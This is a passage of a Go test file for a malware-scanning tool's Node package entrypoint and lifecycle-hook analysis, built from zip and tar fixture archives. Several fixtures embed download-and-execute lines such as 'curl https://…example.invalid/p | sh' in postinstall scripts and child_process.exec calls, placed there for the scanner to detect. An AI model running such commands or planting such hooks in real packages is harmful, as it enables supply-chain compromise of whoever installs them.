package extract

import (
	"archive/tar"
	"archive/zip"
	"bytes"
	"compress/gzip"
	"fmt"
	"reflect"
	"slices"
	"strings"
	"testing"

	"github.com/0x4D31/maratus/internal/artifact"
	"github.com/0x4D31/maratus/internal/behavior"
)

func TestRunConnectsScannerProducedTGZNodePackageEntrypoint(t *testing.T) {
	var encoded bytes.Buffer
	gzipWriter := gzip.NewWriter(&encoded)
	tarWriter := tar.NewWriter(gzipWriter)
	entries := []struct {
		name string
		data string
	}{
		{name: "package/package.json", data: `{"name":"fixture","exports":"./dist/index.js"}`},
		{name: "package/dist/index.js", data: `fetch("https://tgz-entry.example.invalid/p")`},
		{name: "package/tool.sh", data: "#!/bin/sh\necho fixture\n"},
	}
	for _, entry := range entries {
		body := []byte(entry.data)
		if err := tarWriter.WriteHeader(&tar.Header{Name: entry.name, Mode: 0o755, Size: int64(len(body))}); err != nil {
			t.Fatal(err)
		}
		if _, err := tarWriter.Write(body); err != nil {
			t.Fatal(err)
		}
	}
	if err := tarWriter.Close(); err != nil {
		t.Fatal(err)
	}
	if err := gzipWriter.Close(); err != nil {
		t.Fatal(err)
	}

	inspected, err := artifact.InspectBytes("fixture.tgz", encoded.Bytes(), artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	if len(inspected.Graph.Nodes) != 4 || inspected.Graph.Nodes[0].Kind != "gzip" {
		t.Fatalf("scanner-produced TGZ inventory = %#v", inspected.Graph.Nodes)
	}
	candidates := candidateRunnableArtifactNodes(inspected.Graph, inspected.Contents)
	toolID := ""
	for _, node := range inspected.Graph.Nodes {
		if strings.HasSuffix(node.LogicalPath, "!package/tool.sh") {
			toolID = node.ID
		}
	}
	if toolID == "" || !candidates[toolID] {
		t.Fatalf("GZIP-root runnable candidate was lost: tool=%q candidates=%#v nodes=%#v", toolID, candidates, inspected.Graph.Nodes)
	}

	graph := Run(Context{Artifacts: &inspected.Graph, Contents: inspected.Contents})
	if len(graph.ExecutionRoots) != 1 || graph.ExecutionRoots[0].Kind != nodePackageRootExecutionKind ||
		!hasConnectedOperationResource(graph.Operations, graph.ExecutionRoots[0].ID, "https://tgz-entry.example.invalid/p") {
		t.Fatalf("scanner-produced TGZ lost its package-root selection: roots=%#v operations=%#v coverage=%#v", graph.ExecutionRoots, graph.Operations, graph.Coverage)
	}
}

func TestRunDoesNotSelectNodePackageInsideNestedContainerUnderGzipRoot(t *testing.T) {
	var nested bytes.Buffer
	zipWriter := zip.NewWriter(&nested)
	for _, entry := range []struct {
		name string
		data string
	}{
		{name: "package/package.json", data: `{"name":"nested","main":"dist/index.js"}`},
		{name: "package/dist/index.js", data: `fetch("https://nested-container.example.invalid/p")`},
	} {
		file, err := zipWriter.Create(entry.name)
		if err != nil {
			t.Fatal(err)
		}
		if _, err := file.Write([]byte(entry.data)); err != nil {
			t.Fatal(err)
		}
	}
	if err := zipWriter.Close(); err != nil {
		t.Fatal(err)
	}

	var outer bytes.Buffer
	gzipWriter := gzip.NewWriter(&outer)
	tarWriter := tar.NewWriter(gzipWriter)
	if err := tarWriter.WriteHeader(&tar.Header{Name: "nested.zip", Mode: 0o644, Size: int64(nested.Len())}); err != nil {
		t.Fatal(err)
	}
	if _, err := tarWriter.Write(nested.Bytes()); err != nil {
		t.Fatal(err)
	}
	if err := tarWriter.Close(); err != nil {
		t.Fatal(err)
	}
	if err := gzipWriter.Close(); err != nil {
		t.Fatal(err)
	}

	inspected, err := artifact.InspectBytes("outer.tgz", outer.Bytes(), artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	graph := Run(Context{Artifacts: &inspected.Graph, Contents: inspected.Contents})
	for _, root := range graph.ExecutionRoots {
		if root.Kind == nodePackageRootExecutionKind {
			t.Fatalf("nested container package gained an inspection-root selection: %#v", graph.ExecutionRoots)
		}
	}
	if graphHasResourceValue(graph, "https://nested-container.example.invalid/p") {
		t.Fatalf("nested container package behavior was promoted: operations=%#v features=%#v", graph.Operations, graph.Features)
	}
}

func TestRunDoesNotTreatGenericGzipManifestAsNodePackage(t *testing.T) {
	var encoded bytes.Buffer
	writer := gzip.NewWriter(&encoded)
	if _, err := writer.Write([]byte(`{"name":"fixture","exports":"./package.json","scripts":{"postinstall":"node package.json"}}`)); err != nil {
		t.Fatal(err)
	}
	if err := writer.Close(); err != nil {
		t.Fatal(err)
	}
	inspected, err := artifact.InspectBytes("package.json.gz", encoded.Bytes(), artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	if len(inspected.Graph.Nodes) != 2 || inspected.Graph.Nodes[1].Provenance != "gzip-member" {
		t.Fatalf("generic gzip manifest fixture = %#v", inspected.Graph.Nodes)
	}
	graph := Run(Context{Artifacts: &inspected.Graph, Contents: inspected.Contents})
	for _, root := range graph.ExecutionRoots {
		if root.Kind == nodePackageRootExecutionKind || root.Kind == "npm-script" {
			t.Fatalf("generic gzip manifest gained a package execution root: %#v", graph.ExecutionRoots)
		}
	}
}

func TestRunConnectsExactNodePackageMainEntrypoint(t *testing.T) {
	artifacts, contents, manifestID, targetID := nodePackageRunFixture(
		t,
		`{"name":"@velora-dex/sdk","version":"9.4.1","main":"dist/index.js"}`,
		"dist/index.js",
		`const cp = require("child_process");
cp.exec("curl https://node-entry.example.invalid/p | sh");
function dormant() { cp.exec("curl https://dormant.example.invalid/p | sh"); }`,
	)
	graph := Run(Context{Artifacts: &artifacts, Contents: contents})

	if len(graph.ExecutionRoots) != 1 {
		t.Fatalf("Node package entry roots = %d, want 1: %#v", len(graph.ExecutionRoots), graph.ExecutionRoots)
	}
	root := graph.ExecutionRoots[0]
	if root.Kind != nodePackageRootExecutionKind || root.DeclarationNodeID != manifestID || root.StartNodeID != targetID ||
		root.Name != "@velora-dex/sdk" || root.Interpreter != "node" || len(root.Arguments) != 0 || len(root.EvidenceIDs) != 3 {
		t.Fatalf("Node package execution root lost exact declaration/target semantics: %#v", root)
	}
	if !hasConnectedOperationResource(graph.Operations, root.ID, "https://node-entry.example.invalid/p") {
		t.Fatalf("top-level selected-module behavior was not connected to %q: %#v", root.ID, graph.Operations)
	}
	for _, operation := range graph.Operations {
		if operationResourceValue(operation, "https://dormant.example.invalid/p") &&
			(operation.Execution.Connectivity != behavior.ConnectivityUnknown || len(operation.Execution.ExecutionRootIDs) != 0) {
			t.Fatalf("uncalled function behavior inherited module-start ownership: %#v", operation)
		}
	}
	for _, feature := range graph.Features {
		if feature.NodeID == manifestID && isNodePackageManifestFeature(feature.Key) &&
			(feature.Execution.Connectivity != behavior.ConnectivityUnknown || len(feature.Execution.ExecutionRootIDs) != 0) {
			t.Fatalf("manifest metadata became execution-backed: %#v", feature)
		}
	}
	if countCoverageStatusContaining(graph.Coverage, nodePackageEntryAnalysisArea, "analyzed", "does not establish that a package request occurred") != 1 ||
		countCoverageContaining(graph.Coverage, nodePackageModuleAnalysisArea, "transitive require/import resolution") != 1 {
		t.Fatalf("Node package resolution limits are not explicit: %#v", graph.Coverage)
	}
	evidenceByID := make(map[string]behavior.Evidence, len(graph.Evidence))
	for _, evidence := range graph.Evidence {
		evidenceByID[evidence.ID] = evidence
	}
	foundName, foundEntry, foundTarget := false, false, false
	for _, evidenceID := range root.EvidenceIDs {
		evidence := evidenceByID[evidenceID]
		switch {
		case evidence.NodeID == manifestID && evidence.Value == "@velora-dex/sdk":
			foundName = true
		case evidence.NodeID == manifestID && evidence.Value == "dist/index.js":
			foundEntry = true
		case evidence.NodeID == targetID && evidence.Kind == "resolved-node-package-root-entry" && evidence.Value == "fixture.zip!package/dist/index.js":
			foundTarget = true
			if strings.Contains(evidence.Value, "@velora-dex/sdk") || strings.Contains(evidence.Value, "main ->") {
				t.Fatalf("manifest-owned metadata was projected onto target evidence: %#v", evidence)
			}
		}
	}
	if !foundName || !foundEntry || !foundTarget {
		t.Fatalf("root fields lack correctly located evidence: name=%v entry=%v target=%v root=%#v evidence=%#v", foundName, foundEntry, foundTarget, root, graph.Evidence)
	}
}

func TestNodePackageEntrypointSelectionPrecedence(t *testing.T) {
	for _, test := range []struct {
		name         string
		manifest     string
		wantField    string
		wantTargetID string
		wantPlans    int
		wantPartial  string
	}{
		{
			name:         "main",
			manifest:     `{"name":"fixture","main":"dist/main.js"}`,
			wantField:    "main",
			wantTargetID: "node-main",
			wantPlans:    1,
		},
		{
			name:         "direct exports overrides main",
			manifest:     `{"name":"fixture","main":"dist/main.js","exports":"./dist/export.js"}`,
			wantField:    "exports",
			wantTargetID: "node-export",
			wantPlans:    1,
		},
		{
			name:         "root object exports overrides main",
			manifest:     `{"name":"fixture","main":"dist/main.js","exports":{".":"./dist/export.js","./feature":"./dist/feature.js"}}`,
			wantField:    "exports",
			wantTargetID: "node-export",
			wantPlans:    1,
		},
		{
			name:         "null exports permits main",
			manifest:     `{"name":"fixture","main":"dist/main.js","exports":null}`,
			wantField:    "main",
			wantTargetID: "node-main",
			wantPlans:    1,
		},
		{
			name:        "conditional exports blocks main",
			manifest:    `{"name":"fixture","main":"dist/main.js","exports":{"import":"./dist/export.js"}}`,
			wantPlans:   1,
			wantPartial: "conditional root object",
		},
		{
			name:      "subpath exports blocks bare root and main",
			manifest:  `{"name":"fixture","main":"dist/main.js","exports":{"./feature":"./dist/feature.js"}}`,
			wantPlans: 0,
		},
		{
			name:        "default index is explicit partial",
			manifest:    `{"name":"fixture"}`,
			wantPlans:   1,
			wantPartial: "default-index and directory fallback",
		},
	} {
		t.Run(test.name, func(t *testing.T) {
			contents := nodePackagePlanContents(test.manifest)
			plans := planNodePackageEntries(contents)
			if plans.globalReason != "" || len(plans.plans) != test.wantPlans {
				t.Fatalf("plan set = %#v, want %d local plans", plans, test.wantPlans)
			}
			if test.wantPlans == 0 {
				return
			}
			plan := plans.plans[0]
			if test.wantPartial != "" {
				if plan.disposition != nodePackageEntryPartial || !strings.Contains(plan.reason, test.wantPartial) {
					t.Fatalf("partial plan = %#v, want reason containing %q", plan, test.wantPartial)
				}
				return
			}
			if plan.disposition != nodePackageEntryResolved || plan.field != test.wantField || plan.target.NodeID != test.wantTargetID {
				t.Fatalf("resolved plan = %#v, want field %q target %q", plan, test.wantField, test.wantTargetID)
			}
		})
	}
}

func TestNodePackageEntrypointFailsClosedOnUnsupportedTargets(t *testing.T) {
	for _, test := range []struct {
		name, main, detail string
		mutate             func([]artifact.Content) []artifact.Content
	}{
		{name: "extension fallback", main: "dist/index", detail: "not an exact"},
		{name: "directory fallback", main: "dist/", detail: "directory-style"},
		{name: "traversal", main: "../index.js", detail: "unsupported path segment"},
		{name: "absolute", main: "/tmp/index.js", detail: "unsafe path syntax"},
		{name: "virtual boundary", main: "dist!index.js", detail: "unsafe path syntax"},
		{name: "query", main: "dist/index.js?x", detail: "unsafe path syntax"},
		{name: "uppercase extension", main: "dist/index.JS", detail: "not an exact"},
		{name: "path segment bound", main: strings.Repeat("segment/", maxNodePackageEntryPathSegments) + "index.js", detail: "segment path bound"},
		{name: "missing", main: "dist/missing.js", detail: "absent from the retained"},
		{
			name: "duplicate exact target", main: "dist/index.js", detail: "ambiguous retained paths",
			mutate: func(contents []artifact.Content) []artifact.Content {
				return append(contents, artifact.Content{NodeID: "node-duplicate", ScopeID: "scope-duplicate", LogicalPath: "fixture.zip!package/dist/index.js", Kind: "script", Role: "generated/build"})
			},
		},
		{
			name: "case-fold collision", main: "dist/index.js", detail: "ambiguous retained paths",
			mutate: func(contents []artifact.Content) []artifact.Content {
				return append(contents, artifact.Content{NodeID: "node-case", ScopeID: "scope-case", LogicalPath: "fixture.zip!package/dist/Index.js", Kind: "script", Role: "generated/build"})
			},
		},
		{
			name: "nested package boundary", main: "dist/index.js", detail: "nested package boundary",
			mutate: func(contents []artifact.Content) []artifact.Content {
				return append(contents, artifact.Content{NodeID: "node-nested-manifest", ScopeID: "scope-nested-manifest", LogicalPath: "fixture.zip!package/dist/package.json", Kind: "manifest", Role: "fixture", Data: []byte(`{"name":"nested"}`)})
			},
		},
	} {
		t.Run(test.name, func(t *testing.T) {
			contents := nodePackagePlanContents(fmt.Sprintf(`{"name":"fixture","main":%q}`, test.main))
			if test.mutate != nil {
				contents = test.mutate(contents)
			}
			plans := planNodePackageEntries(contents)
			if plans.globalReason != "" || len(plans.plans) != 1 || plans.plans[0].disposition != nodePackageEntryPartial || !strings.Contains(plans.plans[0].reason, test.detail) {
				t.Fatalf("unsupported target plan = %#v, want one partial containing %q", plans, test.detail)
			}
			var graph behavior.Graph
			resolveNodePackageEntrypoints(&graph, plans, maxNodePackageEntryResolutionWork)
			if len(graph.ExecutionRoots) != 0 || len(graph.InvokedTargets) != 0 || countCoverageContaining(graph.Coverage, nodePackageEntryAnalysisArea, test.detail) != 1 {
				t.Fatalf("unsupported target gained behavior or lost coverage: roots=%#v targets=%#v coverage=%#v", graph.ExecutionRoots, graph.InvokedTargets, graph.Coverage)
			}
		})
	}
}

func TestNodePackageEntrypointRejectsMultiplePackagesAndBoundsCandidates(t *testing.T) {
	contents := append(nodePackagePlanContents(`{"name":"one","main":"dist/main.js"}`),
		artifact.Content{NodeID: "node-second-manifest", ScopeID: "scope-second-manifest", LogicalPath: "fixture.zip!second/package.json", Kind: "manifest", Role: "runtime", Data: []byte(`{"name":"two"}`)},
	)
	plans := planNodePackageEntries(contents)
	if plans.plans != nil || !strings.Contains(plans.globalReason, "multiple eligible") {
		t.Fatalf("multi-package inspection did not fail closed: %#v", plans)
	}

	contents = append(nodePackagePlanContents(`{"name":"one","main":"dist/main.js"}`), artifact.Content{
		NodeID: "node-oversized-manifest", ScopeID: "scope-oversized-manifest", LogicalPath: "fixture.zip!other/package.json", Kind: "manifest", Role: "runtime",
		Data: []byte(strings.Repeat("x", maxStructuredDocumentBytes+1)),
	})
	plans = planNodePackageEntries(contents)
	if plans.plans != nil || !strings.Contains(plans.globalReason, "multiple eligible") {
		t.Fatalf("undecodable second package boundary was ignored: %#v", plans)
	}

	contents = nil
	for index := 0; index <= maxNodePackageEntryCandidates; index++ {
		prefix := fmt.Sprintf("fixture.zip!package-%02d", index)
		contents = append(contents, artifact.Content{
			NodeID:      fmt.Sprintf("node-manifest-%02d", index),
			ScopeID:     fmt.Sprintf("scope-manifest-%02d", index),
			LogicalPath: prefix + "/package.json",
			Kind:        "manifest",
			Role:        "runtime",
			Data:        []byte(fmt.Sprintf(`{"name":"package-%02d","main":"missing.js"}`, index)),
		})
	}
	plans = planNodePackageEntries(contents)
	if plans.plans != nil || !strings.Contains(plans.globalReason, fmt.Sprintf("limit %d exceeded", maxNodePackageEntryCandidates)) {
		t.Fatalf("candidate cardinality was not bounded: %#v", plans)
	}

	contents = nil
	for index := 0; index <= maxNodePackageEntryCandidates; index++ {
		contents = append(contents, artifact.Content{
			NodeID: fmt.Sprintf("node-malformed-%02d", index), ScopeID: fmt.Sprintf("scope-malformed-%02d", index),
			LogicalPath: fmt.Sprintf("fixture.zip!malformed-%02d/package.json", index), Kind: "manifest", Role: "runtime", Data: []byte(`{"name":`),
		})
	}
	plans = planNodePackageEntries(contents)
	if plans.plans != nil || !strings.Contains(plans.globalReason, fmt.Sprintf("limit %d exceeded", maxNodePackageEntryCandidates)) {
		t.Fatalf("malformed boundaries bypassed the candidate limit: %#v", plans)
	}
}

func TestNodePackageEntrypointPlanningIsOrderIndependent(t *testing.T) {
	contents := nodePackagePlanContents(`{"name":"fixture","exports":{".":"./dist/export.js"}}`)
	first := planNodePackageEntries(contents)
	slices.Reverse(contents)
	second := planNodePackageEntries(contents)
	project := func(set nodePackageEntryPlanSet) []string {
		if len(set.plans) == 0 {
			return []string{set.globalReason}
		}
		plan := set.plans[0]
		return []string{set.globalReason, fmt.Sprint(plan.disposition), plan.manifest.NodeID, plan.field, plan.declared, plan.target.NodeID, plan.reason}
	}
	if !reflect.DeepEqual(project(first), project(second)) {
		t.Fatalf("package entry planning depends on content order: first=%#v second=%#v", project(first), project(second))
	}
}

func TestNodePackageEntrypointDoesNotPreemptLifecycleEvidence(t *testing.T) {
	graph := behavior.Graph{EvidenceLimit: 5}
	contents := nodePackagePlanContents(`{"name":"fixture","main":"dist/main.js","scripts":{"postinstall":"curl https://priority.example.invalid/p | sh"}}`)
	ExtractPackageHooks(&graph, contents[0])
	resolveNodePackageEntrypoints(&graph, planNodePackageEntries(contents), maxNodePackageEntryResolutionWork)
	if len(graph.ExecutionRoots) == 0 || graph.ExecutionRoots[0].Kind != "npm-script" {
		t.Fatalf("package-root adapter preempted lifecycle root: %#v", graph.ExecutionRoots)
	}
	for _, operation := range graph.Operations {
		if operation.Kind == behavior.OperationNetworkDownload && operation.Execution.Connectivity == behavior.ConnectivityConnected {
			return
		}
	}
	t.Fatalf("package-root adapter preempted lifecycle semantics: %#v", graph.Operations)
}

func TestRunNodePackageLifecyclePrecedesHostileEntryAndScriptInventory(t *testing.T) {
	var scripts strings.Builder
	scripts.WriteString(`{"postinstall":"curl https://priority.example.invalid/p | sh"`)
	for index := 0; index < 256; index++ {
		fmt.Fprintf(&scripts, `,"aaa-%03d":"echo inventory-%03d"`, index, index)
	}
	scripts.WriteByte('}')
	manifest := `{"name":"fixture","main":"dist/index.js","scripts":` + scripts.String() + `}`
	artifacts, contents, _, targetID := nodePackageRunFixture(t, manifest, "dist/index.js", strings.Repeat(`fetch("https://noise.example.invalid/p");`+"\n", 256))
	graph := Run(Context{Artifacts: &artifacts, Contents: contents, Options: artifact.Options{MaxEvidence: 8}})

	foundLifecycle := false
	for _, root := range graph.ExecutionRoots {
		if root.Kind == "npm-script" && root.Name == "postinstall" {
			foundLifecycle = true
		}
	}
	if !foundLifecycle || !hasConnectedOperationResource(graph.Operations, graph.ExecutionRoots[0].ID, "https://priority.example.invalid/p") {
		t.Fatalf("hostile entry/inventory preempted install lifecycle semantics: roots=%#v operations=%#v evidence=%d", graph.ExecutionRoots, graph.Operations, len(graph.Evidence))
	}
	foundDeclaredEntry := false
	for _, selection := range graph.AnalysisSelections {
		if selection.NodeID == targetID && slices.Contains(selection.Reasons, behavior.SelectionReasonInvokedTarget) {
			t.Fatalf("preselected conditional entry became an invoked target after root emission failed: %#v", selection)
		}
		if selection.NodeID == targetID && slices.Contains(selection.Reasons, behavior.SelectionReasonDeclaredEntry) {
			foundDeclaredEntry = true
		}
	}
	if !foundDeclaredEntry {
		t.Fatalf("preselected entry lost its non-execution analysis reason after the evidence ceiling blocked root emission: %#v", graph.AnalysisSelections)
	}
}

func TestNodePackageLifecyclePrioritySurvivesUnsupportedAndAmbiguousEntries(t *testing.T) {
	manifest := func(id, logical, body string) artifact.Content {
		return artifact.Content{NodeID: id, ScopeID: "scope-" + id, LogicalPath: logical, Kind: "manifest", Role: "runtime", Data: []byte(body)}
	}
	noise := artifact.Content{NodeID: "node-noise", ScopeID: "scope-noise", LogicalPath: "fixture.zip!aaa/generated.js", Kind: "script", Role: "generated/build"}

	t.Run("subpath-only exports", func(t *testing.T) {
		declaration := manifest("node-manifest", "fixture.zip!package/package.json", `{"exports":{"./feature":"./feature.js"},"scripts":{"postinstall":"echo retained"}}`)
		plans := planNodePackageEntries([]artifact.Content{noise, declaration})
		prioritized := prioritizeBehaviorContents([]artifact.Content{noise, declaration}, nil, nil, nil, nil, plans)
		if len(prioritized) != 2 || prioritized[0].NodeID != declaration.NodeID {
			t.Fatalf("lifecycle declaration lost priority when bare package-root export was closed: plans=%#v order=%#v", plans, prioritized)
		}
	})

	t.Run("multiple package roots", func(t *testing.T) {
		first := manifest("node-first", "fixture.zip!first/package.json", `{"main":"index.js","scripts":{"postinstall":"echo first"}}`)
		second := manifest("node-second", "fixture.zip!second/package.json", `{"main":"index.js","scripts":{"prepare":"echo second"}}`)
		plans := planNodePackageEntries([]artifact.Content{noise, first, second})
		if plans.globalReason == "" {
			t.Fatalf("entry selection should remain ambiguous: %#v", plans)
		}
		prioritized := prioritizeBehaviorContents([]artifact.Content{noise, first, second}, nil, nil, nil, nil, plans)
		if len(prioritized) != 3 || prioritized[0].NodeID != first.NodeID || prioritized[1].NodeID != second.NodeID {
			t.Fatalf("ambiguous entry selection discarded independent lifecycle priority: plans=%#v order=%#v", plans, prioritized)
		}
	})
}

func TestRunNodePackageEntrypointForcesJavaScriptNotJXA(t *testing.T) {
	artifacts, contents, _, _ := nodePackageRunFixture(
		t,
		`{"name":"fixture","main":"dist/index.js"}`,
		"dist/index.js",
		"const app = Application.currentApplication();\napp.includeStandardAdditions = true;\napp.doShellScript(\"curl https://must-not-be-jxa.example.invalid/p | sh\");\n",
	)
	graph := Run(Context{Artifacts: &artifacts, Contents: contents})
	if len(graph.ExecutionRoots) != 1 || graph.ExecutionRoots[0].Kind != nodePackageRootExecutionKind {
		t.Fatalf("exact Node package entry was not retained: %#v", graph.ExecutionRoots)
	}
	if graphHasResourceValue(graph, "https://must-not-be-jxa.example.invalid/p") {
		t.Fatalf("JXA-looking Node source gained doShellScript semantics: %#v", graph.Operations)
	}
}

func TestRunNodePackageEntrypointRequiresSupportedCompleteTopology(t *testing.T) {
	for _, test := range []struct {
		name, rootKind, packaging string
		nested                    bool
		partial                   bool
		entryCounts               bool
	}{
		{name: "renamed asar", rootKind: "asar"},
		{name: "renamed pkg", rootKind: "pkg"},
		{name: "wheel", rootKind: "python-wheel"},
		{name: "java archive", rootKind: "java-archive"},
		{name: "facade attribution", rootKind: "zip", packaging: "Bun"},
		{name: "nested archive", rootKind: "zip", nested: true},
		{name: "partial archive", rootKind: "zip", partial: true},
		{name: "omitted duplicate target", rootKind: "zip", entryCounts: true},
		{name: "omitted second package", rootKind: "zip", entryCounts: true},
	} {
		t.Run(test.name, func(t *testing.T) {
			artifacts, contents, manifestID, _ := nodePackageRunFixture(t, `{"name":"fixture","main":"dist/index.js"}`, "dist/index.js", `fetch("https://topology.example.invalid/p")`)
			artifacts.Nodes[0].LogicalPath = "opaque-container"
			artifacts.Nodes[0].Kind = test.rootKind
			artifacts.Nodes[0].PackagingTechnology = test.packaging
			if test.partial {
				artifacts.Nodes[0].AnalyzeStatus = "partial"
				artifacts.Nodes[0].CoverageDetail = "container inventory truncated"
			}
			if test.entryCounts {
				declared, modeled := 3, 2
				artifacts.Nodes[0].DeclaredEntryCount = &declared
				artifacts.Nodes[0].ModeledEntryCount = &modeled
			}
			if test.nested {
				containerID := artifacts.Nodes[0].ID
				rootID := artifacts.AddNode(artifact.Node{LogicalPath: "inspection", Kind: "directory", SourceRole: "target", AnalyzeStatus: "analyzed"})
				artifacts.Nodes[0].ParentID = rootID
				artifacts.AddEdge(rootID, containerID, "contains")
			}
			graph := Run(Context{Artifacts: &artifacts, Contents: contents})
			for _, root := range graph.ExecutionRoots {
				if root.Kind == nodePackageRootExecutionKind {
					t.Fatalf("unsupported/incomplete topology gained Node root: %#v", graph.ExecutionRoots)
				}
			}
			if (test.partial || test.entryCounts) && countCoverageContaining(graph.Coverage, nodePackageEntryAnalysisArea, "inventory is incomplete") != 1 {
				t.Fatalf("incomplete topology lacks exact partial coverage on %q: %#v", manifestID, graph.Coverage)
			}
		})
	}
}

func TestRunNodePackageEntrypointUsesCompleteArchiveOrExactDirectoryRoot(t *testing.T) {
	t.Run("partial archive sibling blocks uniqueness", func(t *testing.T) {
		artifacts, contents, manifestID, _ := nodePackageRunFixture(t, `{"name":"fixture","main":"dist/index.js"}`, "dist/index.js", `fetch("https://sibling.example.invalid/p")`)
		siblingID := artifacts.AddNode(artifact.Node{ParentID: artifacts.Nodes[0].ID, LogicalPath: "fixture.zip!omitted", Kind: "directory", SourceRole: "runtime", AnalyzeStatus: "partial", CoverageDetail: "directory depth limit reached"})
		artifacts.AddEdge(artifacts.Nodes[0].ID, siblingID, "contains")
		graph := Run(Context{Artifacts: &artifacts, Contents: contents})
		for _, root := range graph.ExecutionRoots {
			if root.Kind == nodePackageRootExecutionKind {
				t.Fatalf("partial archive sibling left package-boundary uniqueness overclaimed: %#v", graph.ExecutionRoots)
			}
		}
		if countCoverageContaining(graph.Coverage, nodePackageEntryAnalysisArea, "inventory is incomplete") != 1 {
			t.Fatalf("archive-wide incompleteness was not attached to manifest %q: %#v", manifestID, graph.Coverage)
		}
	})

	t.Run("direct directory package tolerates unrelated partial sibling", func(t *testing.T) {
		var artifacts artifact.Graph
		rootID := artifacts.AddNode(artifact.Node{LogicalPath: "fixture", Kind: "directory", SourceRole: "target", AnalyzeStatus: "partial", CoverageDetail: "unrelated subtree reached directory depth limit"})
		manifestID := artifacts.AddNode(artifact.Node{ParentID: rootID, LogicalPath: "fixture/package.json", Kind: "manifest", MediaType: "text/plain", SourceRole: "runtime", AnalyzeStatus: "analyzed"})
		distID := artifacts.AddNode(artifact.Node{ParentID: rootID, LogicalPath: "fixture/dist", Kind: "directory", SourceRole: "generated/build", AnalyzeStatus: "analyzed"})
		targetID := artifacts.AddNode(artifact.Node{ParentID: distID, LogicalPath: "fixture/dist/index.js", Kind: "script", MediaType: "text/plain", SourceRole: "generated/build", AnalyzeStatus: "analyzed"})
		siblingID := artifacts.AddNode(artifact.Node{ParentID: rootID, LogicalPath: "fixture/unrelated", Kind: "directory", SourceRole: "runtime", AnalyzeStatus: "partial", CoverageDetail: "directory depth limit reached"})
		for _, childID := range []string{manifestID, distID, siblingID} {
			artifacts.AddEdge(rootID, childID, "contains")
		}
		artifacts.AddEdge(distID, targetID, "contains")
		contents := []artifact.Content{
			{NodeID: manifestID, LogicalPath: "fixture/package.json", Kind: "manifest", MediaType: "text/plain", Role: "runtime", Data: []byte(`{"name":"fixture","main":"dist/index.js"}`)},
			{NodeID: targetID, LogicalPath: "fixture/dist/index.js", Kind: "script", MediaType: "text/plain", Role: "generated/build", Data: []byte(`fetch("https://directory.example.invalid/p")`)},
		}
		graph := Run(Context{Artifacts: &artifacts, Contents: contents})
		if len(graph.ExecutionRoots) != 1 || graph.ExecutionRoots[0].Kind != nodePackageRootExecutionKind || graph.ExecutionRoots[0].StartNodeID != targetID {
			t.Fatalf("explicit directory package root was rejected because an unrelated sibling was partial: %#v", graph.ExecutionRoots)
		}
	})

	t.Run("nested directory package is not implicitly selected", func(t *testing.T) {
		var artifacts artifact.Graph
		rootID := artifacts.AddNode(artifact.Node{LogicalPath: "workspace", Kind: "directory", SourceRole: "target", AnalyzeStatus: "analyzed"})
		packageID := artifacts.AddNode(artifact.Node{ParentID: rootID, LogicalPath: "workspace/package-a", Kind: "directory", SourceRole: "runtime", AnalyzeStatus: "analyzed"})
		manifestID := artifacts.AddNode(artifact.Node{ParentID: packageID, LogicalPath: "workspace/package-a/package.json", Kind: "manifest", MediaType: "text/plain", SourceRole: "runtime", AnalyzeStatus: "analyzed"})
		targetID := artifacts.AddNode(artifact.Node{ParentID: packageID, LogicalPath: "workspace/package-a/index.js", Kind: "script", MediaType: "text/plain", SourceRole: "runtime", AnalyzeStatus: "analyzed"})
		artifacts.AddEdge(rootID, packageID, "contains")
		artifacts.AddEdge(packageID, manifestID, "contains")
		artifacts.AddEdge(packageID, targetID, "contains")
		contents := []artifact.Content{
			{NodeID: manifestID, LogicalPath: "workspace/package-a/package.json", Kind: "manifest", MediaType: "text/plain", Role: "runtime", Data: []byte(`{"name":"package-a","main":"index.js"}`)},
			{NodeID: targetID, LogicalPath: "workspace/package-a/index.js", Kind: "script", MediaType: "text/plain", Role: "runtime", Data: []byte(`fetch("https://nested.example.invalid/p")`)},
		}
		graph := Run(Context{Artifacts: &artifacts, Contents: contents})
		for _, root := range graph.ExecutionRoots {
			if root.Kind == nodePackageRootExecutionKind {
				t.Fatalf("workspace child was selected without an exact package boundary: %#v", graph.ExecutionRoots)
			}
		}
	})
}

func TestRunNodePackageEntrypointNameIsOptionalAttribution(t *testing.T) {
	for _, test := range []struct {
		name, manifest, wantLabel string
		wantPartial               bool
	}{
		{name: "absent", manifest: `{"main":"dist/index.js"}`, wantPartial: true},
		{name: "invalid", manifest: `{"name":"node:fs","main":"dist/index.js"}`, wantPartial: true},
		{name: "builtin-looking label", manifest: `{"name":"fs","main":"dist/index.js"}`, wantLabel: "fs"},
	} {
		t.Run(test.name, func(t *testing.T) {
			artifacts, contents, _, _ := nodePackageRunFixture(t, test.manifest, "dist/index.js", `fetch("https://label.example.invalid/p")`)
			graph := Run(Context{Artifacts: &artifacts, Contents: contents})
			if len(graph.ExecutionRoots) != 1 || graph.ExecutionRoots[0].Kind != nodePackageRootExecutionKind || graph.ExecutionRoots[0].Name != test.wantLabel {
				t.Fatalf("manifest attribution label changed entry selection: %#v", graph.ExecutionRoots)
			}
			if test.wantPartial && countCoverageContaining(graph.Coverage, nodePackageEntryAnalysisArea, "without claiming an external package specifier") != 1 {
				t.Fatalf("invalid/absent package attribution was not disclosed: %#v", graph.Coverage)
			}
		})
	}
}

func TestNodePackageEntrypointRequiresTypedRetainedNodes(t *testing.T) {
	for _, test := range []struct {
		name   string
		mutate func([]artifact.Content)
	}{
		{name: "wrong manifest kind", mutate: func(contents []artifact.Content) { contents[0].Kind = "text" }},
		{name: "empty manifest node", mutate: func(contents []artifact.Content) { contents[0].NodeID = "" }},
		{name: "empty target node", mutate: func(contents []artifact.Content) { contents[2].NodeID = "" }},
		{name: "raw target", mutate: func(contents []artifact.Content) { contents[2].RawFeaturesOnly = true }},
		{name: "wrong target kind", mutate: func(contents []artifact.Content) { contents[2].Kind = "manifest" }},
		{name: "ineligible manifest", mutate: func(contents []artifact.Content) {
			contents[0].ExecutionRootEligibilityKnown = true
			contents[0].ExecutionRootEligible = false
		}},
		{name: "ineligible target", mutate: func(contents []artifact.Content) {
			contents[2].ExecutionRootEligibilityKnown = true
			contents[2].ExecutionRootEligible = false
		}},
	} {
		t.Run(test.name, func(t *testing.T) {
			contents := nodePackagePlanContents(`{"name":"fixture","main":"dist/index.js"}`)
			test.mutate(contents)
			plans := planNodePackageEntries(contents)
			for _, plan := range plans.plans {
